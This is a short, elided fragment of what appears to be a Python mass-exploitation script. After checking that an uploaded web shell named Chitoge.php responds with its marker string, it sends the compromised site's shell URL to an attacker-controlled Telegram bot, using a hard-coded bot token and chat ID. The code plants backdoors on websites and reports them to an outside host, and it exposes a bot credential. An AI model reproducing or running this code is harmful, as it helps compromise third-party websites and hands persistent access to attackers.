        ...
        if resp:
            ...
            if getkey:
                ...
                if 'Chitoge kirisaki' in cekshell:
                    ...
                    save.close()
                    res = 'Host : '+url+'/Chitoge.php?Chitoge'
                    data = {'chat_id'   : '2118043877',
                            'text'      : res
                            }
                    r = requests.post(url = "https://api.telegram.org/bot5290929178:AAFB6OFEV5pOeqPSMDyargDwhwZKJs7VhPs/sendMessage", data = data)
                else:
